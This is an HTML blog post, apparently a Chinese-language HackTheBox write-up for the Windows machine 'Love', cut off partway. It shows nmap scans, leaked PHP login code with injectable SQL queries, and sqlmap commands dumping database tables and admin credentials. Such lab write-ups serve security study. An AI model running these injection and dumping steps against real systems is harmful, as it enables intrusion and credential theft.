@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+<meta name="referrer" content="no-referrer" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
+  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
+  <link rel="manifest" href="/images/logo_icon.svg">
+  <meta name="msapplication-config" content="/images/logo_icon.svg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="The more knowledge you drink, the more thirsty you are.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB_Windows_Set">
+<meta property="og:url" content="https://yoloyolo.top/2021/06/09/HTB-Windows-Set/index.html">
+<meta property="og:site_name" content="xXxYOLOxXx">
+<meta property="og:description" content="The more knowledge you drink, the more thirsty you are.">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-06-09T09:20:32.000Z">
+<meta property="article:modified_time" content="2021-06-09T09:24:22.463Z">
+<meta property="article:author" content="xXxYOLOxXx">
+<meta property="article:tag" content="Pentest">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yoloyolo.top/2021/06/09/HTB-Windows-Set/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>HTB_Windows_Set | xXxYOLOxXx</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xXxYOLOxXx</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2021/06/09/HTB-Windows-Set/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xXxYOLOxXx">
+      <meta itemprop="description" content="Explorer for unknown.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xXxYOLOxXx">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB_Windows_Set
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-06-09 17:20:32 / Modified: 17:24:22" itemprop="dateCreated datePublished" datetime="2021-06-09T17:20:32+08:00">2021-06-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Study/" itemprop="url" rel="index"><span itemprop="name">Study</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>The more knowledge you drink, the more thirsty you are.</p>
+<a id="more"></a>
+<h1 id="love"><a class="markdownIt-Anchor" href="#love"></a> love</h1>
+<h2 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h2>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.239</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.239</span><br><span class="line">Host is up (0.87s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=6/9%Time=60C04557%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed</span></span><br><span class="line"><span class="string">SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(GenericLines,4</span><br><span class="line">SF:9,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x2</span></span><br><span class="line"><span class="string">SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(HTTPOptions,49,<span class="string">&quot;E</span></span><br><span class="line"><span class="string">SF:\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\</span></span><br><span class="line"><span class="string">SF:x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(RPCCheck,49,<span class="string">&quot;E\0\0\x0</span></span><br><span class="line"><span class="string">SF:1\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20conn</span></span><br><span class="line"><span class="string">SF:ect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(DNSStatusRequestTCP,49,<span class="string">&quot;E\0\</span></span><br><span class="line"><span class="string">SF:0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20</span></span><br><span class="line"><span class="string">SF:connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(TerminalServerCookie,49,</span><br><span class="line">SF:<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20t</span></span><br><span class="line"><span class="string">SF:o\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(Kerberos,49,<span class="string">&quot;E\0\0\</span></span><br><span class="line"><span class="string">SF:x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20co</span></span><br><span class="line"><span class="string">SF:nnect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(X11Probe,49,<span class="string">&quot;E\0\0\x01\xff</span></span><br><span class="line"><span class="string">SF:j\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x</span></span><br><span class="line"><span class="string">SF:20to\x20this\x20MariaDB\x20server&quot;</span>)%r(FourOhFourRequest,49,<span class="string">&quot;E\0\0\x01\x</span></span><br><span class="line"><span class="string">SF:ffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect</span></span><br><span class="line"><span class="string">SF:\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(LDAPSearchReq,49,<span class="string">&quot;E\0\0\x01\xff</span></span><br><span class="line"><span class="string">SF:j\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x</span></span><br><span class="line"><span class="string">SF:20to\x20this\x20MariaDB\x20server&quot;</span>)%r(LDAPBindReq,49,<span class="string">&quot;E\0\0\x01\xffj\x0</span></span><br><span class="line"><span class="string">SF:4Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to</span></span><br><span class="line"><span class="string">SF:\x20this\x20MariaDB\x20server&quot;</span>)%r(SIPOptions,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host</span></span><br><span class="line"><span class="string">SF:\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20t</span></span><br><span class="line"><span class="string">SF:his\x20MariaDB\x20server&quot;</span>)%r(TerminalServer,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\</span></span><br><span class="line"><span class="string">SF:x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th</span></span><br><span class="line"><span class="string">SF:is\x20MariaDB\x20server&quot;</span>)%r(NCP,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.</span></span><br><span class="line"><span class="string">SF:16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaD</span></span><br><span class="line"><span class="string">SF:B\x20server&quot;</span>)%r(JavaRMI,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x</span></span><br><span class="line"><span class="string">SF:20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20ser</span></span><br><span class="line"><span class="string">SF:ver&quot;</span>);</span><br><span class="line">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 443 10.10.10.239</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.239</span><br><span class="line">Host is up (0.75s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=<span class="keyword">in</span></span><br><span class="line">| Not valid before: 2021-01-18T14:00:16</span><br><span class="line">|_Not valid after:  2022-01-18T14:00:16</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (95%), Microsoft Windows Longhorn (95%), Microsoft Windows 10 1703 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 1709 - 1803 (93%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Server 2008 SP2 (92%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Hosts: www.example.com, www.love.htb</span><br></pre></td></tr></table></figure>
+<p>这里需要对SSL端口进行更加详细的扫描才能得到域名<code>staging.love.htb</code><br />
+不使用域名访问443端口则会被403<br />
+5000端口则是直接403</p>
+<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2>
+<p>用域名访问443端口可以看到一个LFI漏洞<br />
+file协议读取即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#C:\xampp\htdocs\omrs\login.php</span></span><br><span class="line">	session_start();</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;includes/conn.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$voter</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;voter&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM voters WHERE voters_id = &#x27;<span class="subst">$voter</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$query</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$query</span>-&gt;num_rows &lt; <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Cannot find voter with the ID&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$row</span> = <span class="variable">$query</span>-&gt;fetch_assoc();</span><br><span class="line">			<span class="keyword">if</span>(password_verify(<span class="variable">$password</span>, <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;voter&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Incorrect password&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Input voter credentials first&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	header(<span class="string">&#x27;location: index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#C:\xampp\htdocs\omrs\admin\includes\conn.php</span></span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;votesystem&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">	    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#C:\xampp\htdocs\omrs\admin\login.php</span></span><br><span class="line">	session_start();</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;includes/conn.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$query</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$query</span>-&gt;num_rows &lt; <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Cannot find account with the username&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$row</span> = <span class="variable">$query</span>-&gt;fetch_assoc();</span><br><span class="line">			<span class="keyword">if</span>(password_verify(<span class="variable">$password</span>, <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Incorrect password&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Input admin credentials first&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	header(<span class="string">&#x27;location: index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">#C:\xampp\htdocs\omrs\admin\includes\conn.php</span></span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;votesystem&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">	    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>明显地存在SQL注入</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/login.php&quot;</span> -data <span class="string">&quot;voter=123&amp;password=321&amp;login=&quot;</span> --dbs</span><br><span class="line">available databases [6]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br><span class="line">[*] <span class="built_in">test</span></span><br><span class="line">[*] votesystem</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem --tables</span><br><span class="line">Database: votesystem</span><br><span class="line">[5 tables]</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">| candidates |</span><br><span class="line">| positions  |</span><br><span class="line">| voters     |</span><br><span class="line">| votes      |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T admin --columns</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: admin</span><br><span class="line">[7 columns]</span><br><span class="line">+------------+--------------+</span><br><span class="line">| Column     | Type         |</span><br><span class="line">+------------+--------------+</span><br><span class="line">| created_on | date         |</span><br><span class="line">| firstname  | varchar(50)  |</span><br><span class="line">| id         | int(11)      |</span><br><span class="line">| lastname   | varchar(50)  |</span><br><span class="line">| password   | varchar(60)  |</span><br><span class="line">| photo      | varchar(150) |</span><br><span class="line">| username   | varchar(50)  |</span><br><span class="line">+------------+--------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T admin -C username, password --dump</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: admin</span><br><span class="line">[1 entry]</span><br><span 